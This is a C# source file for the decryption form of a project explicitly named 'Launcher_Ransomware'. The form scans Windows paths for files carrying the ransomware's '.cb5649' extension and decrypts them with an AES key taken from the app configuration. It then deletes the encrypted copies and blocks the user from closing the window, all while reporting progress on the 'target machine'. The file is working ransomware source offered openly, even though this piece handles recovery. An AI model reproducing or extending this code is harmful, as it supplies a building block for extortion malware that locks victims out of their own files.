namespace Launcher_Ransomware
{
    public partial class Decryption : Form
    {
        private static WinPaths _winPaths;
        private static FileMethod _fileMethod;
        private static readonly string encrypted_file_extension = ".cb5649";

        public Decryption()
        {
            InitializeComponent();
            BtnFinish.Enabled = false;
            _winPaths = new WinPaths();
            _fileMethod = new FileMethod();        
        }

        private async void Decryption_LoadAsync(object sender, EventArgs e)
        {
            // Define paths
            List<string> all_paths = _winPaths.All_Paths;

            // Get total number of files that are going to be decrypted
            List<FileInfo> filesInfo = await InitializeAsync(all_paths);

            // Initilize the decryption
            await InitializeDecryptionAsync(filesInfo);
        }

        private void Decryption_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        /// <summary>
        /// Close the program
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BtnFinish_Click(object sender, EventArgs e)
        {   
            MessageBox.Show("Congratulations! Your files have been decrypted :)", "Decryption", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Application.Exit();
        }

        /// <summary>
        /// Get all encrypted files for later decryption
        /// </summary>
        /// <param name="all_paths"></param>
        /// <returns></returns>
        private static async Task<List<FileInfo>> InitializeAsync(List<string> all_paths)
        {
            _fileMethod.ClearTotalFiles();
            List<Task> tasks = new();
            List<FileInfo> fileInfos = new();

            foreach (var path in all_paths)
            {
                if (Directory.Exists(path))
                    tasks.Add(Task.Run(() => _fileMethod.GetAllEncryptedFiles(path)));
            }

            try
            {
                await Task.WhenAll(tasks).ContinueWith(t =>
                {
                    foreach (var file in _fileMethod.GetTotalFiles())
                    {
                        if (File.Exists(file))
                        {
                            string name = Path.GetFileName(file);
                            fileInfos.Add(new FileInfo
                            {
                                Name = name,
                                Path = file
                            });
                        }
                    }
                });
            }
            catch (Exception e)
            {
                MessageBox.Show($"Initialization error: {e.Message}", "Decryption", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return fileInfos;
        }

        /// <summary>
        /// Create the progression bar and initialize the decryption
        /// </summary>
        /// <param name="filesInfo"></param>
        /// <returns></returns>
        private async Task InitializeDecryptionAsync(List<FileInfo> filesInfo)
        {
            Progress<ProgressReport> progress = new();
            progress.ProgressChanged += ReportProgress;

            LblInfo.Text = $"Decrypting {filesInfo.Count} file(s) from target machine";
            await DecryptionProcessAsync(filesInfo, progress);
        }

        /// <summary>
        /// Report back the encrypt progression on the screen
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportProgress(object sender, ProgressReport e)
        {
            if (e.PercentageComplete == 100)
            {
                LblProgress.Text = e.GetTotalPercentageComplete();
                ProgressBar.Value = e.PercentageComplete;
                BtnFinish.Enabled = true;
                return;
            }
            ProgressBar.Value = e.PercentageComplete;
            LblRemain.Text = e.GetTotalDeRemainFiles();
            LblName.Text = e.GetCurrentProcessedFile();
            LblProgress.Text = e.GetTotalPercentageComplete();
        }

        /// <summary>
        /// Update the progression while encrypting the files simultaneously
        /// </summary>
        /// <param name="files"></param>
        /// <param name="progress"></param>
        /// <returns></returns>
        private static async Task DecryptionProcessAsync(List<FileInfo> files, IProgress<ProgressReport> progress)
        {
            List<string> output = new();
            ProgressReport report = new();

            report.TotalFiles = files.Count;
            byte[] encryption_key = _winPaths.HexStringToByteArray(ConfigurationManager.AppSettings["AES.Seckey"]);

            await Task.Run(() =>
            {
                Parallel.ForEach(files, async (file) =>
                {
                    string result = await AES_DecryptionAsync(file.Path, encrypted_file_extension, encryption_key);
                    output.Add(result);

                    report.RemainFiles = output.Count;
                    report.CurrentFilesProcessed = file.Name;
                    report.PercentageComplete = (output.Count * 100) / files.Count;

                    progress.Report(report);
                });
            });
        }

        private static async Task<string> AES_DecryptionAsync(string target_file, string file_extension, byte[] encryption_key)
        {
            try
            {
                using var cipher = Aes.Create();

                var randomIV = new byte[16];
                File.SetAttributes(target_file, FileAttributes.Normal);
                string originalFile = target_file.Substring(0, target_file.Length - file_extension.Length);

                using (var fsIn = File.OpenRead(target_file))
                {
                    await fsIn.ReadAsync(randomIV, 0, randomIV.Length);
                    var decryptor = cipher.CreateDecryptor(encryption_key, randomIV);
                    fsIn.Position = 16;

                    using (var cs = new CryptoStream(fsIn, decryptor, CryptoStreamMode.Read))
                    {
                        using (var fsOut = File.Create(originalFile))
                        {
                            await cs.CopyToAsync(fsOut);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "Encryption Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
            finally
            {
                File.Delete(target_file);
            }
            return target_file;
        }
    }
}
